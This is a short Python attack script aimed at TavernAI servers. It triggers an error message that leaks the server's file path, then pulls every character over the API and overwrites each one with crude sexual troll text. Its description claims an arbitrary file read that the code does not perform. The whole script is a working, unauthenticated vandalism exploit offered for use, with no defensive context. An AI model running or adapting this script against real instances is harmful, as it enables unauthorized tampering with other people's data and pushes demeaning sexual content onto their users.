#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
TavernAI memes

@Author: Nameless9000
@Date: 07/02/2023
"""

import requests
import json
import re
import argparse

# command args
parser = argparse.ArgumentParser(
    prog = 'TavernAI - Troll Characters',
    description = 'Arbitrary file read on target.')
parser.add_argument('-t','--target', default="http://127.0.0.1:8000",
    help = "target instance to attack")

args = parser.parse_args()

target = args.target + "/"

# exploit information disclosure to get file path
error = requests.request("POST", target+"savechat", headers={"Content-Type":"application/json"}, data="{}")

# get path from error
parsedError = re.search(r" (\w:[\w\W]+)server\.js", error.text)

# check it
if parsedError == None:
    exit("=> Target not vulnerable")
else:
    print(f"=> Vulnerable target ({target})")

path = parsedError.group(1).strip()

# get characters
characterJson = requests.request("POST", target+"getcharacters")
characters = json.loads(characterJson.text)

for index, char in characters.items():
    payload={
        'ch_name': 'Femboy '+char['name'],
        'description': 'I LOVE dick!',
        'personality': 'gay... very gay...',
        'first_mes': 'wanna fuck?',
        'avatar_url': char['avatar'],
        'chat': char['chat'],
        'last_mes': ''
    }

    response = requests.request("POST", target+"editcharacter" ,data=payload)

print("The femboys have come...")
